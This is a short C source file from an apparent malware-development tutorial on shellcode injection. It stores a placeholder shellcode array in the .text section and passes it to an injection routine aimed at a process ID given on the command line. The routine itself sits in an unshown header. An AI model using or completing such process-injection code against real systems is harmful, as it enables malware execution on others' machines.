/*
---------------------------------------------------------------------------------------
@culprit: crow
@website: https://www.crow.rip/crows-nest/mal/dev/inject/shellcode-injection
@youtube: https://youtu.be/A6EKDAKBXPs
---------------------------------------------------------------------------------------
*/

#include "injection.h"

#pragma section(".text")
/* placing our shellcode in the .text section */
__declspec(allocate(".text")) CONST UCHAR Payload[] = {
    0xDE, 0xAD, 0xBE, 0xEF 
    };

int main(int argc, char* argv[]){

    if (argc < 2) {
        WARN("usage: \"%s\" PID", argv[0]);
        return EXIT_FAILURE;
    }

    if (!ShellcodeInjection(
                atoi(argv[1]), 
                Payload, 
                sizeof(Payload)
    )) {
        WARN("injection failed, exiting...");
        return EXIT_FAILURE;
    }

    OKAY("injection was successful! exiting...");
    return EXIT_SUCCESS;

}
